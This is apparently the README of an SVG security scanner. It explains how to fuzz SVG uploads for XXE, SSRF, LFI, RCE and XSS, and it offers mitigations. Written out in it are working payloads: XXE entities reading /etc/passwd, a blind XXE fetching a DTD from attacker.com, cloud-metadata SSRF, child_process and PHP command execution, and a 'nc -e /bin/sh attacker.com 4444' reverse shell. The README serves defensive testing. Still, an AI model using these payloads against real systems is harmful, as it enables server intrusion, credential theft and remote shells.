## sl0ppy-svg-intel-scan
```
Ultimate SVG Security Intelligence Scanner
Built by x0xr00t for Personal Use
SVG Security Scanner
```
📜 Table of Contents
```
Introduction
Features
Vulnerabilities Detected
Installation
Usage
Configuration
Technical Deep Dive

XXE Exploitation
SSRF Exploitation
LFI Exploitation
RCE Exploitation
XSS in SVG
Delivery Pipeline Vulnerabilities

Mitigations
Legal Notice
License
```

##📌 Introduction
```sl0ppy-svg-intel-scan is a passive/active security scanner designed to detect server-side vulnerabilities in SVG files. It combines deep fuzzing, static analysis, and theoretical chain testing to identify XXE, SSRF, LFI, RCE, XSS, and delivery pipeline vulnerabilities in SVG files.
Why SVG?
SVG files are often whitelisted in upload filters (e.g., "images only") but can contain executable code (JavaScript, XML entities) and external references (XLink, CSS, scripts). Many servers render SVGs server-side (e.g., for thumbnails, PDFs, or previews), enabling exploitation.
```
🔍 Features


  
    
      Feature
      Description
    
  
  
    
      Deep Fuzzing
      Tests for XXE, SSRF, LFI, RCE, XSS with 100+ payloads per vulnerability type.
    
    
      Static Analysis
      Detects dangerous tags, attributes, and JavaScript in SVG files.
    
    
      Theoretical Chain Testing
      Identifies multi-step attack paths (e.g., XXE → LFI → RCE).
    
    
      Easter Eggs
      Hidden messages for DIVD, NCSC, JSCU, DCC, KPN, SOC.
    
    
      Extended Protocols
      Detects 200+ execution protocols (JavaScript, file, network, custom).
    
    
      Event Handler Detection
      Scans for 150+ XSS vectors in SVG attributes.
    
    
      Delivery Pipeline Testing
      Checks for CORS misconfigurations, header injection, open redirects, cache poisoning.
    
    
      Risk Scoring
      Rates vulnerabilities from 0 (minimal risk) to 10 (critical risk).
    
    
      Certificate Bypass
      Includes custom HTTPS agent to bypass certificate validation for testing.
    
    
      NL-Specific Payloads
      Custom payloads for Dutch environments (e.g., KVK, AWV, DigiD).
    
  



🚨 Vulnerabilities Detected

```
  
    
      Vulnerability
      Severity (1-10)
      Description
      Example Payload
    
  
  
    
      XXE
      10/10
      XML External Entity attacks for file disclosure, SSRF, RCE.
      
    
    
      SSRF
      10/10
      Server-Side Request Forgery to access internal services (AWS metadata, Redis, MySQL).
      
    
    
      LFI
      9/10
      Local File Inclusion for reading sensitive files (/etc/passwd, config files).
      
    
    
      RCE
      10/10
      Remote Code Execution via SVG scripts or server-side rendering (e.g., ImageMagick).
      require("child_process").exec("id")
    
    
      XSS
      8/10
      Cross-Site Scripting in SVG attributes (e.g., onload=).
      
    
    
      Header Injection
      7/10
      HTTP header injection for cache poisoning and XSS.
      X-Forwarded-Host: attacker.com
    
    
      CORS Misconfig
      6/10
      Cross-Origin Resource Sharing vulnerabilities.
      Access-Control-Allow-Origin: *
    
    
      Open Redirects
      6/10
      Unvalidated redirects for phishing and credential theft.
      /redirect?url=http://attacker.com
    
  ```



## 🛠 Installation
* Prerequisites

* Node.js (v14 or higher)
* npm (Node Package Manager)
Steps

# Clone the repository:
```
git clone https://github.com/your-repo/sl0ppy-svg-intel-scan.git
cd sl0ppy-svg-intel-scan
```

## Install dependencies:
```
npm install jsdom node-fetch
```

## (Optional) Verify dependencies:
```
npm list
```


## 🚀 Usage
* Basic Scan

* Start the scanner:
```
node sl0ppy-svg-intel-scan.js
```

## Enter the target SVG URL when prompted:

```
Target SVG URL: https://example.com/test.svg
```

## Advanced Scan

* Scan with custom payloads:
```

node sl0ppy-svg-intel-scan.js --custom-payloads payloads.json
```

## Scan with verbose output:
```
node sl0ppy-svg-intel-scan.js --verbose
```

## Example Output
```
▌ [EASTER EGG] The ghost says hi to DIVD! 👻

[*] Fetching https://example.com/test.svg
[VULN] Found 2 <script> tags
[VULN] Executable SVG tag <script>
[VULN] Event attribute "onload"

▌ SERVER-SIDE – FUZZING & CHAINED PAYLOADS
[FUZZ] Testing XXE payload: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ ...
[VULN] XXE vulnerability detected!
[FUZZ] Testing SSRF payload: <svg><image href="http://169.254.169.254/" /></svg>
[VULN] SSRF vulnerability detected!

▌ IMPACT & CHAIN FEASIBILITY
[VULN] Possible attack chains:
[SUCCESS] • SVG XXE → LFI (file:///)
[SUCCESS] • SVG XXE → RCE (via PHP filters)
[SUCCESS] • SVG SSRF → Cloud metadata access (AWS/GCP/Azure)

▌ SCORE BREAKDOWN
[VULN] CRITICAL RISK: Immediate action required
[VULN] • High confidence in exploitability
[VULN] • Multiple attack chains possible

▌ FINAL INTELLIGENCE SCORE: 9/10
```

## ⚙ Configuration
* Customizing Payloads
* Edit the payload lists in the script to add or modify test cases:

```
// Example: Custom XXE payloads
const XXE_PAYLOADS = [
  '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg><text>&xxe;</text></svg>',
  '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]><svg><text>&xxe;</text></svg>',
];
```
## Adding Easter Eggs
* Extend the ORG_DOMAINS object to include more organizations:
```
const ORG_DOMAINS = {
  'divd.nl': 'DIVD',
  'ncsc.nl': 'NCSC',
  'your-org.com': 'Your Org Name',
};
```
## Custom HTTPS Agent
* The scanner uses a custom HTTPS agent to bypass certificate validation:
```

const customAgent = new Agent({
  rejectUnauthorized: false // Bypass certificate validation for testing
});
```

## 🔬 Technical Deep Dive
```
XXE Exploitation
What is XXE?
XML External Entity (XXE) attacks exploit XML parsers that support external entities. Attackers can:

Read local files (/etc/passwd, /etc/shadow).
Perform SSRF to access internal services.
Execute RCE via PHP filters (php://filter).
```
## Payloads
```
<!-- Basic XXE -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- Blind XXE -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;

<!-- PHP Filter XXE -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## Mitigation

```
// Disable XXE in Java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

## SSRF Exploitation
```
What is SSRF?
Server-Side Request Forgery (SSRF) forces a server to make unintended requests to internal services. Attackers can:

Access cloud metadata (AWS, GCP, Azure).
Scan internal networks (port scanning).
Exploit internal services (Redis, MySQL, MongoDB).
```

## Payloads
```

<!-- Basic SSRF -->
<svg><image href="http://169.254.169.254/" /></svg>

<!-- Internal Port Scanning -->
<svg><image href="http://localhost:22/" /></svg>
<svg><image href="http://localhost:3306/" /></svg>

<!-- Cloud Metadata -->
<svg><image href="http://metadata.google.internal/" /></svg>
```
# Mitigation
```
Block internal IPs (e.g., 169.254.169.254, 127.0.0.1).
Use allowlists for outbound requests.
```
## LFI Exploitation
```
What is LFI?
Local File Inclusion (LFI) allows attackers to read local files on the server. Attackers can:

Read sensitive files (/etc/passwd, /etc/shadow).
Access log files (Apache/Nginx logs).
Exploit log poisoning for RCE.
```
## Payloads

```
<!-- Basic LFI -->
<svg><image href="file:///etc/passwd" /></svg>

<!-- Path Traversal -->
<svg><image href="file:///../../../../etc/passwd" /></svg>

<!-- Log Poisoning -->
<svg><image href="file:///var/log/nginx/access.log" /></svg>
```
# Mitigation
```
Disable file:// protocol in SVG parsers.
Sanitize user input in file paths.
```

#RCE Exploitation
```
What is RCE?
Remote Code Execution (RCE) allows attackers to execute arbitrary commands on the server. Attackers can:

Spawn reverse shells (nc -e /bin/sh attacker.com 4444).
Write malicious files to disk.
Escalate privileges if running as root.
```
## Payloads
```

// Node.js RCE
<svg><script>require("child_process").exec("id")</script></svg>

// PHP RCE
<svg xmlns="http://www.w3.org/2000/svg"><?php system("id"); ?></svg>
```
## Mitigation
```
Disable script execution in SVG parsers.
Use sandboxed environments for SVG rendering.
```

## XSS in SVG
```
What is XSS?
Cross-Site Scripting (XSS) in SVG allows attackers to execute JavaScript in the context of the victim's browser. Attackers can:

Steal cookies/session tokens.
Perform DOM clobbering.
Bypass CSP (Content Security Policy).
```
Payloads
```
<!-- Basic XSS -->
<svg onload="alert(1)"></svg>

<!-- Obfuscated XSS -->
<svg><script>eval(atob("YWxlcnQoMSk="))</script></svg>

<!-- Data URI XSS -->
<svg><script src="data:text/javascript,alert(1)"></script></svg>
```
## Mitigation

## Use CSP headers:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
`

Sanitize SVG attributes (e.g., onload, href).
```

## Delivery Pipeline Vulnerabilities
* What are Delivery Pipeline Vulnerabilities?
```
These vulnerabilities affect how SVG files are delivered to clients. Attackers can exploit:

Misconfigured CORS for cross-origin attacks.
Missing security headers (e.g., X-Content-Type-Options).
Header injection for cache poisoning.
Open redirects for phishing.
```
## Payloads

```
// CORS Misconfiguration
Access-Control-Allow-Origin: *

// Header Injection
X-Forwarded-Host: attacker.com

// Open Redirect
/redirect?url=http://attacker.com
```

## Mitigation

Set secure headers:

```
Access-Control-Allow-Origin: https://trusted-domain.com
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

Validate redirects:
```

// Node.js example
const allowedDomains = ['trusted-domain.com'];
if (!allowedDomains.includes(new URL(url).hostname)) {
  throw new Error('Invalid redirect URL');
}

```

## 🛡 Mitigations
* For Developers


# Disable XXE Processing:
```
// Java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
# php
```

// PHP
libxml_disable_entity_loader(true);
```


## Sanitize SVG Uploads:

## Strip dangerous tags:

```
<script>, <foreignObject>, onload, onclick, xlink:href="file://"
```

#Use whitelisting for allowed SVG elements.


#Server-Side Rendering:
```
Use sandboxed environments (e.g., Docker).
Disable external entity processing in libraries (e.g., librsvg, ImageMagick).
```

#Network Segmentation:
```
Block internal IPs (e.g., 169.254.169.254, 127.0.0.1).
Use firewall rules to limit outbound requests.
```
# Security Headers:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```


## Monitor Logs:

* Watch for suspicious SVG uploads (e.g., <!ENTITY, xlink:href="file://").
* Alert on unusual outbound requests (e.g., SSRF attempts).


## ⚖ Legal Notice
This tool is for authorized security testing only. Unauthorized use against systems you do not own or have permission to test is illegal and may violate:

Computer Fraud and Abuse Act (CFAA) (United States).
General Data Protection Regulation (GDPR) (European Union).
Wet Computercriminaliteit III (Netherlands).
Always obtain proper authorization before testing.

📄 License
This project is licensed under the MIT License. See LICENSE for details.
